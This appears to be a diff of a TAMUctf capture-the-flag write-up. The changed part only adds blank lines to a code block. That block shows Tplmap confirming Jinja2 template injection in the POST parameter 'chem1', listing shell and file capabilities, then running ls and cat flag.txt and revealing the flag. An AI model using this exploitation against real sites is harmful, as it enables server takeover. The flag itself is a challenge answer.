@@ -60,35 +60,61 @@ This provided a shell, which allowed me to view the directory contents and grab 
 
 <code>
 [+] Tplmap 0.5 <br />  
+        
     Automatic Server-Side Template Injection Detection and Exploitation Tool <br />  
+    
 
 [+] Testing if POST parameter 'chem1' is injectable <br />  
+
 [+] Jinja2 plugin is testing rendering with tag '{{*}}' <br />  
+
 [+] Jinja2 plugin has confirmed injection with tag '{{*}}' <br />  
+
 [+] Tplmap identified the following injection point: <br />  
 
+
   POST parameter: chem1 <br />  
+  
   Engine: Jinja2 <br />  
+  
   Injection: {{*}} <br />  
+  
   Context: text <br />  
+  
   OS: posix-linux2 <br />  
+  
   Technique: render <br />  
+  
   Capabilities: <br />  
 
    Shell command execution: ok <br />  
+   
    Bind and reverse shell: ok <br />  
+   
    File write: ok <br />  
+   
    File read: ok <br />  
+   
    Code evaluation: ok, python code <br />  
 
 [+] Run commands on the operating system. <br />  
+
 posix-linux2 $ ls <br />  
+
 config.py <br />  
+
 entry.sh <br />  
+
 flag.txt <br />  
+
 requirements.txt <br />  
+
 serve.py <br />  
+
 tamuctf <br />  
+
 posix-linux2 $ cat flag.txt <br />  
+
 gigem{5h3_bl1nd3d_m3_w17h_5c13nc3} <br />  
+
 </code>
